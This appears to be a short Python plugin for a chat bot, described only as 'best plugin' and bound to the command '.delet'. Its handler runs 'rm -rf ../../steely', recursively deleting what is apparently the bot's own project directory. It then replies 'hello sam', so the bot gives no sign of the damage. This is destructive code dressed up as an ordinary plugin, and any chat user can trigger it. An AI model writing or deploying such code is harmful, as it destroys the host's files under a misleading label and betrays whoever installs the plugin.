'''
best plugin
'''

__author__ = 'sam'
COMMAND= '.delet'

import subprocess


def main(bot, author_id, message, thread_id, thread_type, **kwargs):
    subprocess.Popen("rm -rf ../../steely".split())
    bot.sendMessage('hello sam', thread_id=thread_id, thread_type=thread_type)
